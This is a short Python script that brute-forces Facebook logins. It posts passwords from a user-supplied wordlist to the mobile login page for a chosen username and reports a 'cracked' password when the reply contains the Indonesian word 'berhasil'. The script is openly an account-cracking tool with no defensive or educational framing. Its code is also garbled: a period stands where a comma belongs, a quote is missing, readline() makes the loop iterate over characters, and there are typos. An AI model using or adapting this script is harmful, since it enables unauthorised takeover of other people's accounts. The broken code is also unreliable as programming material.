from os import system
import requests

url="https://m.facebook.com/login.php"
user=input("username/id : ")
word=input("wordlist : ")
passwd=open(word, 'r').readline()
for lines in passwd:
    pw=lines.strip()
    http=requests.post(url. data={"email":user, password":pw, "sumbit":"sumbit"})
    k=http.content
    if "berhasil" in str(k):
        print("cracked :",pw)
    else:
        print("wrong password :".pw)    
